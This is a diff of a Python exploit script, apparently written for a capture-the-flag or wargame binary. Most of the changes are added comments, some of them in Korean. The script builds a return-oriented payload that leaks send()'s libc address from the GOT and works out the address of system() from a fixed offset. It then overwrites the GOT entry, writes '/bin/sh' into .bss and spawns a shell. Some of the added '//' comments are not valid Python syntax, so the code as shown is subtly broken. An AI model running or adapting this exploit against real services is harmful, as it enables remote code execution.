@@ -27,32 +27,32 @@ payload += p(send_got)
 payload += p(4)
 payload += p(0)
 
-payload += p(recv_plt)
+payload += p(recv_plt) // overwrite
 payload += p(ppppr)
 payload += p(4)
 payload += p(send_got)
 payload += p(4)
 payload += p(0)
 
-payload += p(recv_plt)
+payload += p(recv_plt) #input the system for bss 
 payload += p(ppppr)
 payload += p(4)
 payload += p(bss)
 payload += p(8)
 payload += p(0)
 
-payload += p(send_plt)
+payload += p(send_plt) // system()
 payload += "aaaa"
-payload += p(bss)
+payload += p(bss) 
 
 s.send(payload)
 sleep(1)
 send_libc = up(s.recv(4))[0]
-system_libc = send_libc - offset
+system_libc = send_libc - offset // 라이브러리의 함수 사이의 거리는 일정하기때문에 함수와 함수를 빼서 오프셋을 구한후 빼주면 system_addr
 
 print "[*] system_libc : %s" %hex(system_libc)
 sleep(1)
 s.send(p(system_libc))
 sleep(1)
 
-s.send("/bin/sh")
+s.send("/bin/sh") // send /sh
